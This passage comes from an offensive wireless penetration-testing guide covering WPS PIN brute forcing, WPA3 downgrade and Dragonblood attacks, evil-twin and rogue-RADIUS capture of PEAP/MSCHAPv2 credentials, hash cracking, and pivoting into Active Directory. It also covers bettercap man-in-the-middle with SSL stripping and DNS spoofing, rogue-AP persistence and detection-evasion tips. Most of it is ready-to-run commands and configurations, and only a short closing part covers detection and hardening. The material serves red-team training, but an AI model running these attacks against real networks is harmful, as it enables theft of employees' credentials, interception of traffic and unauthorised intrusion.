# Takes: ~2-10 hours depending on rate limiting

sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
# Starts trying PINs: 12345670, 12345678, 20172048...

# With timeout between attempts (bypass rate limiting):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv -d 5 -r 3:15
# -d 5 = 5 second delay between attempts
# -r 3:15 = after 3 attempts, wait 15 seconds

# Bully (alternative WPS tool):
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
# Sometimes works when reaver doesn't

# ── CHECK RESULT ────────────────────────────────────────────────────
# Once PIN found → reaver reveals the WPA2 passphrase!
# Even if password is changed later, WPS PIN stays the same
# → WPS PIN = permanent backdoor!
# Recommendation: ALWAYS DISABLE WPS in enterprise environments
```

---

# PART 4 — WPA3 ATTACKS

---

## 13. WPA3 — What Changed & What Didn't

```
WPA3 KEY IMPROVEMENTS:

1. SAE (Simultaneous Authentication of Equals / Dragonfly Handshake):
   Replaces PSK 4-way handshake
   Uses Diffie-Hellman key exchange with password as input
   Key benefit: Forward secrecy (captured traffic can't be decrypted even with password)
   Key benefit: Offline dictionary attack NOT possible (unlike WPA2!)
   
   WHY WPA2 CRACK WORKS BUT WPA3 DOESN'T:
   WPA2: Handshake captured → crack offline → PSK derived → decrypt all past/future traffic
   WPA3: Handshake captured → each session has unique keys → cannot crack offline
   
2. PMF (Protected Management Frames) — MANDATORY:
   Management frames (including deauth!) are now authenticated and encrypted
   No more deauthentication attacks against WPA3 clients!
   
3. OWE (Opportunistic Wireless Encryption):
   Encrypts open networks (coffee shops, hotels)
   No passphrase, but traffic still encrypted
   
4. SAE-PK (Public Key authentication):
   Prevents rogue APs with same SSID
   (Requires AP and client support)
   
WHAT WPA3 DIDN'T FIX:
  - Implementation bugs (see Dragonblood)
  - Transition mode vulnerabilities (WPA2/WPA3 mixed)
  - Social engineering / evil twin for credential capture
  - Side-channel attacks against SAE implementation
  - Weak passphrase still crackable (at connection time, not offline)
  
CURRENT STATUS:
  Most enterprise clients: Still WPA2 (WPA3 adoption slow)
  Many APs: Run WPA3 in "Transition Mode" (accepts both WPA2 and WPA3)
  Transition mode = WPA2 is still available = WPA2 attacks still work!
```

---

## 14. Dragonblood — WPA3 SAE Vulnerabilities

```bash
# Dragonblood: suite of vulnerabilities in WPA3 SAE (2019)
# Discovered by Mathy Vanhoef (same researcher who found KRACK in WPA2)
# https://wpa3.mathyvanhoef.com/

# VULNERABILITY 1: Side-Channel Attack (timing/cache)
# SAE's password encoding leaks info about the password via timing differences
# An attacker can determine information about the password character-by-character
# Tool: dragonslayer (https://github.com/vanhoefm/dragonslayer)

git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer

# Measure timing during SAE commit frames:
python3 dragonslayer.py -i wlan0mon -b AP_BSSID -s SSID -d dictionary.txt
# Measures timing of SAE Commit frame responses
# Statistical analysis reveals password characters
# More reliable with more samples (run many attempts)

# VULNERABILITY 2: Denial of Service (Resource Consumption)
# SAE requires AP to perform expensive crypto per connection attempt
# Flood AP with fake SAE Commit frames → AP exhausted
python3 dragonblood.py --dos -i wlan0mon -b AP_BSSID

# PRACTICAL NOTE:
# Dragonblood requires patches on most modern WPA3 implementations
# Check: Is the AP firmware updated after April 2019?
# If unpatched: side-channel attacks can recover password fragments
```

---

## 15. WPA3 Downgrade Attacks

```bash
# DOWNGRADE ATTACK: Force WPA3 clients to use WPA2

# SCENARIO: AP runs WPA3 Transition Mode (accepts WPA2 and WPA3)
# Client connects with WPA2 if evil twin only advertises WPA2
# Once on WPA2 → capture 4-way handshake → crack offline!

# HOW IT WORKS:
# 1. Listen for clients probing for "CorpWireless"
# 2. Create evil twin "CorpWireless" advertising WPA2 only (no WPA3)
# 3. Send deauth to real AP to disconnect clients
# 4. Client auto-connects to our WPA2-only AP
# 5. Capture WPA2 handshake
# 6. Crack offline

# Evil twin setup advertising WPA2:
cat > /tmp/evil_twin_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorpWireless
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYTHING_WRONG_TO_CAPTURE
rsn_pairwise=CCMP
EOF
sudo hostapd /tmp/evil_twin_wpa2.conf &

# With deauth of real AP:
sudo aireplay-ng -0 0 -a REAL_AP_BSSID wlan0mon
# Clients disconnect from real WPA3 AP
# Reconnect to our WPA2 evil twin (because we have same SSID)
# WPA2 handshake captured

# NOTE: WPA3 with PMF and SAE-PK can detect this
# But transition mode doesn't fully prevent it
# This is why WPA3-only (no transition) is recommended
```

---

# PART 5 — EVIL TWIN & ROGUE AP

---

## 16. Evil Twin — Concept & Impact

### Layman's Terms
An evil twin is a **fake access point with the same name (SSID) as a legitimate one**. Devices automatically connect to the strongest signal with a known SSID. You park near a coffee shop with a laptop running "Starbucks_WiFi" at higher power than the real one — every customer's device connects to you. You see all their traffic, inject content, capture credentials.

```
EVIL TWIN IMPACT:

FOR PERSONAL NETWORKS (WPA2-PSK):
  → Capture WPA2 handshake when client connects
  → Crack handshake offline to get PSK
  → Use PSK to join real network later

FOR ENTERPRISE NETWORKS (WPA2-EAP / 802.1X):
  → Set up rogue RADIUS server alongside evil twin
  → Client connects → tries 802.1X authentication
  → Client sends domain credentials (username + MSCHAPv2 hash) to your RADIUS
  → Capture and crack credentials → full AD domain access!
  → This is the highest-value wireless attack

FOR OPEN NETWORKS / CAPTIVE PORTALS:
  → Host identical captive portal
  → Users enter email/password thinking it's coffee shop login
  → Credentials captured
  → MitM all unencrypted traffic

DEPLOYMENT OPTIONS:
  Hardware: Alpha adapter + Raspberry Pi (portable, concealable)
  Software: hostapd-wpe, eaphammer, airbase-ng, Bettercap
  Power: Run higher TX power than real AP → stronger signal wins
```

---

## 17. Hostapd-wpe — WPA2 Enterprise Evil Twin

```bash
# hostapd-wpe (Wi-Fi Protected EAP) captures enterprise credentials
# Creates a fake WPA2-Enterprise AP with rogue RADIUS server

# ── INSTALLATION ──────────────────────────────────────────────────
sudo apt install hostapd-wpe
# Or build from source:
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe && sudo make install

# ── CONFIGURATION ─────────────────────────────────────────────────
cat > /etc/hostapd-wpe/hostapd-wpe.conf << 'EOF'
# Interface (your second wireless adapter — one for monitor, one for AP)
interface=wlan1
driver=nl80211

# Match target AP exactly:
ssid=Corp-WiFi-Enterprise   # Same SSID as target enterprise network!
channel=6
hw_mode=g
ieee80211n=1
ieee80211ac=0

# WPA2-Enterprise settings:
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# 802.1X / RADIUS settings:
ieee8021x=1
eapol_version=2
eap_server=1

# EAP methods to accept:
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

# Certificates (hostapd-wpe comes with self-signed certs):
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# Log credentials here:
wpe_logfile=/tmp/wpe.log

# Enable MSCHAPV2 (what most clients use):
wpe_hs_file=/tmp/wpe.hs
EOF

# EAP user file (accept any username, request PEAP/TTLS):
cat > /etc/hostapd-wpe/hostapd-wpe.eap_user << 'EOF'
* PEAP
* TTLS
"t"  TTLS-MSCHAPV2 "password"  [2]
EOF

# ── START THE EVIL TWIN ────────────────────────────────────────────
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Expected output when client connects:
# wlan1: STA 11:22:33:44:55:66 IEEE 802.11: associated
# wlan1: STA 11:22:33:44:55:66 IEEE 802.1X: EAPOL start
# wlan1: STA 11:22:33:44:55:66 RADIUS: EAP-PEAP start
# mschapv2: username: CORP\alice
# mschapv2: challenge: 1122334455667788
# mschapv2: response: aabbccddeeff00112233...

# ── VIEW CAPTURED CREDENTIALS ─────────────────────────────────────
cat /tmp/wpe.log
# Expected:
# DOMAIN\alice | challenge: 1122334455667788 | response: aabbccddeeff...

# ── ADD DHCP SO CLIENTS GET AN IP ─────────────────────────────────
# Without DHCP, clients connect but get no IP → quickly disconnect
sudo apt install dnsmasq
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,12h
dhcp-option=3,10.0.0.1     # default gateway
dhcp-option=6,8.8.8.8      # DNS
EOF
sudo dnsmasq -C /tmp/dnsmasq.conf
# Also set up internet forwarding so clients don't notice:
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo sysctl net.ipv4.ip_forward=1
```

---

## 18. airbase-ng — Evil Twin for Personal Networks

```bash
# airbase-ng creates a fake AP for personal WPA2 networks
# Use to capture handshakes from clients expecting WPA2-PSK

# ── BASIC OPEN AP (for captive portal attacks) ─────────────────────
sudo airbase-ng -e "Starbucks_WiFi" -c 6 wlan0mon
# -e = SSID to broadcast
# -c = channel

# Expected:
# 03:14:00  Created tap interface at0
# 03:14:00  Trying to set MTU on at0 to 1500
# 03:14:00  Access Point with BSSID AA:BB:CC:DD:EE:FF started.

# Set up IP on the tap interface:
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
sudo service dnsmasq start
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo sysctl net.ipv4.ip_forward=1

# ── DEAUTH REAL AP TO FORCE CLIENTS OVER ──────────────────────────
sudo aireplay-ng -0 0 -a REAL_AP_BSSID wlan0mon
# Continuously deauth real AP → clients join your evil twin

# ── KARMA ATTACK (respond to all probe requests) ───────────────────
# Respond to every probe request with matching SSID:
sudo airbase-ng -P -C 60 -e "AnyNetworkName" -c 6 wlan0mon
# -P = respond to all probe requests (KARMA mode)
# -C 60 = beacon interval

# Combined with hostapd for WPA2:
# (airbase-ng alone has limited WPA2 support)
# Use eaphammer or hostapd-wpe for enterprise
# Use Bettercap for integrated evil twin (Section 31)
```

---

## 19. Eaphammer — Enterprise Wireless Attacks

```bash
# eaphammer: comprehensive tool for WPA2-Enterprise attacks
# Better than hostapd-wpe for many scenarios
# https://github.com/s0lst1c3/eaphammer

git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
pip3 install -r requirements.txt

# Generate certificates:
./eaphammer --cert-wizard
# Follow prompts → generates certs in certs/

# ── EVIL TWIN (PEAP-MSCHAPv2 CREDENTIAL CAPTURE) ──────────────────
sudo ./eaphammer -i wlan1 \
  --channel 6 \
  --auth peap \
  --wpa 2 \
  --essid "Corp-Enterprise" \
  --creds
# --creds = capture and display credentials
# --essid must match target enterprise network EXACTLY

# Expected output when employee connects:
# [*] PEAP client connected
# [*] Received PEAP authentication
# [*] Got MSCHAPv2 credential:
# username: CORP\alice
# challenge: 1122334455667788
# response: aabbccddeeff00112233445566778899aabbccdd

# ── ATTACK WITH KNOWN PSK (for WPA2 handshake capture) ────────────
sudo ./eaphammer -i wlan1 \
  --channel 6 \
  --auth wpa-psk \
  --wpa 2 \
  --essid "CorpGuest" \
  --psk "GuestPassword123" \
  --karma   # Respond to all probe requests

# ── HOSTILE PORTAL ATTACK ──────────────────────────────────────────
# After capturing MSCHAPv2: capture browser credentials too
sudo ./eaphammer -i wlan1 \
  --channel 6 \
  --auth peap \
  --wpa 2 \
  --essid "Corp-Enterprise" \
  --hostile-portal \
  --captive-portal-host 10.0.0.1

# Client authenticates (credentials captured)
# Then redirected to captive portal (Evilginx/credential harvest page)
# Captures both wireless AND web credentials!
```

---

# PART 6 — 802.1X / RADIUS ATTACKS

---

## 21. 802.1X Architecture — What It Protects

### Layman's Terms
802.1X is the **bouncer at the wireless door** for enterprise networks. Instead of a shared password, each user authenticates with their own username and password (or certificate). The AP talks to a RADIUS server which verifies credentials against Active Directory. **The weakness: most configurations don't verify the RADIUS server's certificate** — so a rogue RADIUS server gets credentials sent to it directly.

```
802.1X AUTHENTICATION FLOW:

Supplicant         Authenticator        Authentication Server
(Client)           (AP/Switch)          (RADIUS/NPS)
    │                   │                      │
    │ ← EAP Request ───│                      │
    │   (Identity)       │                      │
    │                   │                      │
    │── EAP Response ──►│                      │
    │   (Username)       │── RADIUS Access-Request ──►│
    │                   │                      │  Verify against AD
    │                   │◄── RADIUS Access-Challenge ─│
    │◄── EAP Challenge ─│   (Random challenge)  │
    │                   │                      │
    │── EAP Response ──►│── RADIUS Access-Request ──►│
    │   (MSCHAPv2 hash) │   (Username + hash)   │  Verify hash
    │                   │◄── RADIUS Access-Accept ───│
    │◄── EAP Success ───│                      │
    │                   │                      │
    [Client gets network access]

ATTACK POINT:
  We set up a ROGUE AUTHENTICATOR (evil twin AP)
  Our AP accepts client's EAP and responds with fake RADIUS challenge
  Client sends MSCHAPv2 response to US (thinking we're the real AP)
  We capture username + challenge + response → crack offline → AD password!
  
WHY CLIENTS FALL FOR IT:
  Most clients configured with:
  "Validate server certificate: NO" (convenience setting)
  Without certificate validation → client accepts ANY RADIUS server
  Including ours!
  
ENTERPRISE IMPACT:
  MSCHAPv2 crack = valid AD username + password
  → Full domain access (if not protected by MFA)
  → VPN access
  → Email access
  → All corporate systems
```

---

## 22. EAP Protocol Types & Their Weaknesses

```
EAP TYPES IN ORDER OF SECURITY (worst to best):

EAP-MD5:
  Deprecated. Challenge-response with MD5.
  Vulnerable to offline dictionary attack.
  Almost never seen in modern environments.

PEAP (Protected EAP) — MOST COMMON:
  Creates TLS tunnel first, then MSCHAPv2 inside
  MSCHAPv2 is in the tunnel (not directly visible)
  WEAKNESS: If client doesn't validate RADIUS cert →
            attacker's rogue RADIUS terminates the tunnel →
            sees the MSCHAPv2 inside → cracks offline
  
TTLS (Tunneled TLS):
  Similar to PEAP but more flexible inner protocol
  WEAKNESS: Same as PEAP — cert validation issue
  
EAP-FAST:
  Uses PAC (Protected Access Credential) file
  Phase 0 can provision PAC without cert →
  Unauthenticated PAC provisioning = attack surface
  
EAP-TLS:
  Client certificate authentication (no password!)
  Mutual TLS — client and server both present certs
  MOST SECURE — no password to capture or crack
  But: if client cert stolen from device → impersonation
  
EAP-TTLS/PAP:
  PAP credentials inside TLS tunnel
  If cert not validated: plaintext password to attacker!
  Even worse than MSCHAPv2 capture
  
ATTACK PRIORITY:
  1. EAP-TTLS/PAP → cleartext password (easiest)
  2. PEAP/MSCHAPv2 → crack MSCHAPv2 (very common)
  3. EAP-FAST unauthenticated PAC → session credentials
  4. EAP-TLS → cert theft from endpoint (hardest)
```

---

## 23. Capturing RADIUS Credentials (PEAP/MSCHAPv2)

```bash
# The full enterprise wireless attack chain:
# Evil Twin → Client connects → RADIUS challenge → Capture credentials

# ── SETUP HOSTAPD-WPE (covered in Section 17) ─────────────────────
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# ── SIMULTANEOUSLY DEAUTH REAL AP ─────────────────────────────────
# In separate terminal:
sudo aireplay-ng -0 0 -a REAL_AP_BSSID wlan0mon
# Continuously sends deauth → forces clients to reconnect

# ── WATCH FOR CREDENTIAL CAPTURE ─────────────────────────────────
tail -f /tmp/wpe.log
# Expected when employee's laptop auto-reconnects to our evil twin:
# 
# mschapv2: Wed Jan 16 03:14:00 2024
# username: CORP\alice
# challenge: 1122334455667788aabb
# response: aabbccddeeff00112233445566778899aabbccddeeff0011
#
# Credentials captured! Now crack MSCHAPv2.

# ── CONVERT TO HASHCAT FORMAT ──────────────────────────────────────
# Format: username:::challenge:response:
echo "CORP\alice:::1122334455667788aabb:aabbccddeeff00112233445566778899aabbccddeeff0011" > mschapv2.hash
```

---

## 24. Cracking MSCHAPv2 — asleap & hashcat

### Layman's Terms
MSCHAPv2 has a fundamental weakness — it uses DES encryption with only **56-bit effective security**. Even better, the 16-byte NT hash is split into three weak DES keys, one of which only has 2 bytes of actual key material. This means the NT hash can be broken in **~23 challenge-response pairs** or directly cracked against dictionaries in seconds.

```bash
# ── ASLEAP — FAST MSCHAPV2 CRACK ─────────────────────────────────
sudo apt install asleap

# Crack from captured challenge/response:
asleap -C 1122334455667788aabb \
       -R aabbccddeeff00112233445566778899aabbccddeeff0011 \
       -W /usr/share/wordlists/rockyou.txt

# With hcxtools capture file:
asleap -r capture.pcapng -W /usr/share/wordlists/rockyou.txt

# Expected:
# asleap 2.2
# Using wordlist mode with "/usr/share/wordlists/rockyou.txt"
# hash bytes:        aabbccddeeff0011
# NT hash:           2b576acbe6bcfda7294d6bd18041b8fe
# password:          Password1234!

# ── HASHCAT — MODE 5500 (NTLMv1) OR 5600 (NTLMv2) ────────────────
# MSCHAPv2 = NTLMv2 format for hashcat:
# Format: username::domain:challenge:response:
echo "alice::CORP:1122334455667788aabb:aabbccddeeff00112233445566778899aabbccddeeff0011:" > mschapv2.hash

# Crack:
hashcat -m 5600 mschapv2.hash /usr/share/wordlists/rockyou.txt
# Mode 5600 = NetNTLMv2
# Expected:
# alice::CORP:...:Password1234!   ← CRACKED!

# ── CLOUD CRACKING FOR MSCHAPV2 ────────────────────────────────────
# CloudCracker specifically designed for WPA2 + MSCHAPv2:
# https://www.cloudcracker.com
# Upload capture file → dictionary + GPU cluster crack it

# ── RESULT: AD CREDENTIAL ──────────────────────────────────────────
# cracked: CORP\alice : Password1234!
# → Test against all corporate services:
crackmapexec smb DC_IP -u alice -p Password1234!        # AD
crackmapexec winrm DC_IP -u alice -p Password1234!      # WinRM
evil-winrm -i DC_IP -u alice -p Password1234!           # Shell
proxychains4 bloodhound-python -u alice -p Password1234! -d corp.local -ns DC_IP -c All
# Straight to domain enumeration!
```

---

# PART 8 — MAN-IN-THE-MIDDLE VIA WIRELESS

---

## 31. Bettercap — Full Wireless MitM Framework

```bash
# Bettercap: modern, modular network attack framework
# Best for: ARP spoofing, SSL stripping, credential capture, evil twin

sudo apt install bettercap

# ── INTERACTIVE MODE ────────────────────────────────────────────────
sudo bettercap -iface wlan1
# Enters interactive console

# ── WIRELESS EVIL TWIN + MitM FULL CHAIN ──────────────────────────
# Step 1: Discover targets
bettercap (wlan1) » net.probe on
bettercap (wlan1) » net.show
# Expected: all devices on local network visible

# Step 2: Start Wi-Fi module for evil twin:
bettercap (wlan1) » wifi.recon on
bettercap (wlan1) » wifi.show
# Shows: all visible APs with signal, clients, encryption

# Deauth specific client:
bettercap (wlan1) » wifi.deauth CLIENT_MAC
# Or deauth all clients from an AP:
bettercap (wlan1) » wifi.deauth AP_BSSID

# Step 3: ARP spoof (MitM on same network):
bettercap (wlan1) » set arp.spoof.targets 192.168.1.50
bettercap (wlan1) » arp.spoof on
# Now: 192.168.1.50's traffic flows through us!

# Step 4: Capture credentials with various sniffers:
bettercap (wlan1) » net.sniff on
bettercap (wlan1) » set net.sniff.regexp ".*password.*"

# Or use specific module for HTTP credentials:
bettercap (wlan1) » http.proxy on
bettercap (wlan1) » set http.proxy.sslstrip true   # SSL stripping

# Step 5: HSTS bypass:
bettercap (wlan1) » https.proxy on
bettercap (wlan1) » hstshijack.start

# Step 6: DNS spoofing (redirect domains):
bettercap (wlan1) » set dns.spoof.domains *.corp.com,*.bank.com
bettercap (wlan1) » set dns.spoof.address 10.0.0.50
bettercap (wlan1) » dns.spoof on

# ── CAPLETS (AUTOMATION SCRIPTS) ──────────────────────────────────
# Bettercap caplets automate complex attack scenarios:
# Download: https://github.com/bettercap/caplets

# Run pre-built mitm caplet:
sudo bettercap -iface wlan1 -caplet mitm.cap

# ── CREDENTIAL CAPTURE ────────────────────────────────────────────
# Bettercap automatically shows captured credentials:
# [http.proxy] POST http://login.company.com/auth
# [http.proxy]   username=alice
# [http.proxy]   password=Password123!

# Capture to file:
bettercap (wlan1) » events.stream on
# All events logged to events.stream
```

---

# PART 9 — ENTERPRISE WIRELESS ATTACKS

---

## 32. WPA2-Enterprise Attack Workflow

```bash
# ══════════════════════════════════════════════════════════════════
# COMPLETE ENTERPRISE WIRELESS ATTACK CHAIN
# Target: Corporate WPA2-Enterprise network
# Goal: Capture AD credentials via rogue RADIUS
# ══════════════════════════════════════════════════════════════════

# PHASE 1: RECONNAISSANCE
sudo airodump-ng wlan0mon
# Identify: enterprise AP (AUTH=MGT), BSSID, channel, clients

# Detailed target info:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise wlan0mon
# Note: how many clients, signal strength, data rate

# PHASE 2: PROFILE THE VICTIM AP
# What EAP type does it use?
# Capture the EAP negotiation in Wireshark:
wireshark enterprise-01.cap
# Filter: eap
# Look at EAP Identity Request → Response → TLS Record → EAP Type

# PHASE 3: SET UP EVIL TWIN
# Match target exactly:
# SSID: Corp-Enterprise
# Channel: 6
# Security: WPA2-EAP

sudo eaphammer -i wlan1 \
  --channel 6 \
  --auth peap \
  --wpa 2 \
  --essid "Corp-Enterprise" \
  --creds \
  --negotiate balanced

# PHASE 4: DEAUTHENTICATE REAL AP
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# Continuous deauth → clients disconnect from real AP

# PHASE 5: WAIT FOR CREDENTIAL CAPTURE
# Watch eaphammer output:
# [*] PEAP AUTHENTICATION - alice@CORP.COM
# [*] challenge: 1122334455667788
# [*] response:  aabbccddeeff...

# PHASE 6: CRACK CREDENTIALS
hashcat -m 5600 captured_hashes.txt rockyou.txt
# Expected: CORP\alice:Password1234!

# PHASE 7: VALIDATE AND PIVOT
crackmapexec smb 10.0.0.10 -u alice -p Password1234! -d CORP
# Expected: [+] CORP\alice:Password1234! (Pwn3d!)

# PHASE 8: DOMAIN ATTACK
bloodhound-python -u alice -p Password1234! -d corp.local \
  -ns 10.0.0.10 -c All --zip
# Map attack paths to Domain Admin
```

---

## 33. Rogue RADIUS Server Setup

```bash
# FreeRADIUS: the real RADIUS server, modified for attack use
# Alternative: eaphammer handles this automatically

# ── FREERADIUS INSTALL ─────────────────────────────────────────────
sudo apt install freeradius

# ── CONFIGURE FOR CREDENTIAL CAPTURE ──────────────────────────────
# Edit /etc/freeradius/3.0/mods-enabled/eap:
sudo nano /etc/freeradius/3.0/mods-enabled/eap
# Change:
# default_eap_type = peap
# peap { default_eap_type = mschapv2 }

# Configure to log all authentications (even failed):
sudo nano /etc/freeradius/3.0/sites-enabled/default
# Add in authorize section:
# update reply { Cleartext-Password := "%{User-Password}" }
# Add in authenticate section:
# Auth-Type MS-CHAP { mschapv2 }

# Start FreeRADIUS in debug mode (see all credentials):
sudo freeradius -X 2>&1 | tee /tmp/radius_capture.log &

# Search captured log for credentials:
tail -f /tmp/radius_capture.log | grep -E "User-Name|MS-CHAP|password"
# Expected:
# (0)     User-Name = 'CORP\alice'
# (0)     MS-CHAP-Challenge = 0x1122334455667788
# (0)     MS-CHAP2-Response = 0xaabbccddeeff...

# ── COMBINE WITH HOSTAPD ────────────────────────────────────────────
# Point hostapd-wpe to local FreeRADIUS:
# In hostapd-wpe.conf:
# radius_server_auth=127.0.0.1
# radius_server_port=1812
# radius_server_secret=testing123

# This routes authentication to FreeRADIUS for more detailed logging
```

---

# PART 10 — POST-COMPROMISE

---

## 35. Post-Wireless-Compromise Actions

```bash
# ══════════════════════════════════════════════════════════════════
# YOU HAVE THE WI-FI PASSWORD — NOW WHAT?
# ══════════════════════════════════════════════════════════════════

# STEP 1: CONNECT TO TARGET NETWORK
# If you have PSK:
nmcli dev wifi connect "CorpWireless" password "Password1234!"
# Or: wpa_supplicant + dhclient

# STEP 2: NETWORK RECONNAISSANCE (from inside the network now!)
# Get full network map:
sudo nmap -sn 192.168.1.0/24   # Host discovery
sudo nmap -sV -p 22,80,443,445,3389,5985 192.168.1.0/24 --open  # Service scan

# Identify key hosts:
sudo nmap -p 88,389,445,636 192.168.1.0/24 --open | grep "Ports"
# Port 88 + 389 + 445 = Domain Controller!

# STEP 3: INTERNAL NETWORK ATTACKS
# With network access → all modules now apply:
# Active Directory Module → BloodHound, Kerberoasting, NTLM relay
# Web App Module → internal web applications
# IoT Module → internal cameras, printers, routers
# PrivEsc Module → any accessible Windows/Linux machines

# STEP 4: TRAFFIC ANALYSIS (passive intel)
sudo tcpdump -i wlan1 -w internal_traffic.pcap &
# Capture 10-15 minutes of traffic
# Analyze: credentials in cleartext (HTTP, FTP, Telnet), internal naming

wireshark internal_traffic.pcap
# Filter: http.authbasic   → HTTP basic auth credentials
# Filter: ftp.request.command == PASS  → FTP passwords
# Filter: telnet           → Telnet sessions
# Filter: dns              → Internal DNS = internal hostname map

# STEP 5: SPECIFIC HIGH-VALUE TARGETS
# Identify and target:
# - Domain Controllers (pivot to AD attacks)
# - Internal web apps (Jira, Confluence, GitLab — often rich with creds)
# - Printers (harvest domain credentials via LDAP config)
# - Cameras (access RTSP feeds, establish persistent foothold)
```

---

## 36. Wireless Persistence

```bash
# MAINTAIN ACCESS EVEN IF PASSWORD CHANGES

# OPTION 1: Clone the AP MAC address (become the AP)
# If you can man-in-the-middle at layer 2, you don't need the password

# OPTION 2: Implant a rogue AP on the network
# If you have physical access during engagement:
# Small device (Raspberry Pi Zero W, Wi-Fi Pineapple) running:
# - AP bridging to internal network
# - SSH reverse tunnel to your external server
# - Survives password changes (uses own AP credentials)

# OPTION 3: Add MAC to approved list
# If you gain admin access to AP controller:
# - Add attacker MAC to whitelist
# - Create secondary SSID without password
# - Reduce AP logging

# OPTION 4: Wireless pivot persistence
# After gaining access to a device on the wireless network:
# Set up Chisel/Ligolo-ng on compromised device (from Pivoting module)
# Access internal network without needing wireless credentials again

# Wi-Fi Pineapple (commercial rogue AP for red teams):
# https://shop.hak5.org/products/wifi-pineapple
# Features: KARMA attacks, evil twin, automated recon, persistence modules
# Used legitimately in authorized red team engagements with client consent
```

---

# PART 11 — DETECTION & DEFENSE

---

## 37. WIDS — Wireless Intrusion Detection

```bash
# WIRELESS IDS SYSTEMS:

# Kismet: open source WIDS
sudo kismet -c wlan0mon
# Detects:
# - Deauthentication floods (deauth attacks)
# - Probe floods (KARMA attacks)
# - New APs with known SSIDs (evil twin)
# - WPS attacks (unusual WPS traffic)
# - Hidden SSID probing

# Snort with wireless rules:
sudo snort -i wlan0mon -c /etc/snort/snort.conf
# Wireless-specific rules detect:
# - Deauth flood
# - Beacon flood
# - ProbeReq flood

# AirDefense (commercial):
# Enterprise WIDS from Motorola/Extreme Networks
# Managed from cloud controller
# Detects: rogue APs, evil twins, cracking attempts

# WatchGuard WIPS:
# Wireless Intrusion Prevention System
# Blocks evil twins by "containing" them (deauth attack against evil twin!)

# ENTERPRISE WIDS ALERTS FOR:
# New SSID appears matching corporate SSID         ← Evil twin indicator
# AP with new BSSID appears for known SSID         ← Evil twin indicator
# Unusual deauth flood                              ← Handshake capture attempt
# High-rate probe responses from unknown AP        ← KARMA attack indicator
# WPS PIN brute force attempts                     ← WPS attack indicator
# RADIUS authentication from unknown supplicant    ← Could be rogue client
```

---

## 38. What Wireless Attacks Leave Behind

```
ARTIFACTS BY ATTACK TYPE:

DEAUTHENTICATION:
  → Clients see: "Disconnected from network"
  → WIDS logs: "Deauth flood from MAC XX:XX:XX"
  → Some clients log the disconnect event
  → 802.11w (PMF) prevents deauth against protected clients
  
EVIL TWIN:
  → WIDS: "Rogue AP detected for SSID Corp-Enterprise"
  → Client logs: "Connected to Corp-Enterprise (wrong BSSID)"
  → RADIUS server logs: "No auth request received for client"
    (client went to rogue RADIUS, real RADIUS never sees it)
  → WIDS alert: new AP with same SSID different BSSID
  
WPS ATTACK:
  → AP logs: WPS lockout triggered
  → Slow version (PIN brute) generates thousands of WPS association events
  → Pixie Dust is faster and generates fewer events
  
HANDSHAKE CAPTURE (passive):
  → No artifacts! Purely passive monitoring
  → Only deauth artifacts if you forced reconnection
  
PMKID CAPTURE:
  → Generates association attempts to the AP
  → AP logs: association from attacker MAC
  → No password exchange → less suspicious than full auth
  
MINIMIZING DETECTION:
  - Don't use broadcast deauth (too noisy) → targeted client deauth
  - Pixie Dust over PIN brute (faster, fewer events)
  - PMKID capture over handshake capture (no deauth needed)
  - Use MAC spoofing to avoid tracing to your hardware
  - Work during business hours (wireless activity expected)
  - Remove evil twin immediately after credential capture
```

---

## 39. Wireless Hardening Checklist

```
╔══════════════════════════════════════════════════════════════════╗
║          WIRELESS SECURITY HARDENING CHECKLIST                  ║
╠══════════════════════════════════════════════════════════════════╣
║  AUTHENTICATION                                                  ║
║  □ WPA3-Enterprise for corporate (WPA2-Enterprise minimum)      ║
║  □ DISABLE WPS on ALL access points                             ║
║  □ Use EAP-TLS (certificates) instead of PEAP/MSCHAPv2         ║
║  □ If PEAP used: REQUIRE server certificate validation          ║
║  □ Strong PSK for guest (16+ chars, changed quarterly)          ║
║  □ No shared PSK for corporate employees                        ║
║                                                                  ║
║  802.1X CONFIGURATION                                           ║
║  □ Clients MUST validate RADIUS server certificate              ║
║  □ RADIUS cert from internal PKI (not self-signed)              ║
║  □ Certificate validation configured via MDM (not user-set)     ║
║  □ Use EAP-TLS for privileged users / admins                    ║
║  □ Log all RADIUS authentication events to SIEM                 ║
║                                                                  ║
║  NETWORK SEGMENTATION                                           ║
║  □ Guest VLAN completely isolated from corporate                ║
║  □ Wireless VLAN isolated from server VLAN                      ║
║  □ IoT devices on separate VLAN                                 ║
║  □ Client isolation enabled on all VLANs                        ║
║                                                                  ║
║  MANAGEMENT FRAMES                                              ║
║  □ Enable 802.11w PMF (Protected Management Frames) — WPA3     ║
║  □ Set PMF to Required (not Optional) for all corporate SSIDs  ║
║  □ Prevents: deauth attacks, beacon flooding                    ║
║                                                                  ║
║  MONITORING                                                      ║
║  □ Deploy WIDS (Wireless IDS) — Kismet minimum                  ║
║  □ Alert on: new SSIDs matching corporate name                  ║
║  □ Alert on: deauth floods                                      ║
║  □ Alert on: WPS brute force attempts                           ║
║  □ Conduct periodic wireless surveys to find rogue APs          ║
║                                                                  ║
║  PHYSICAL                                                        ║
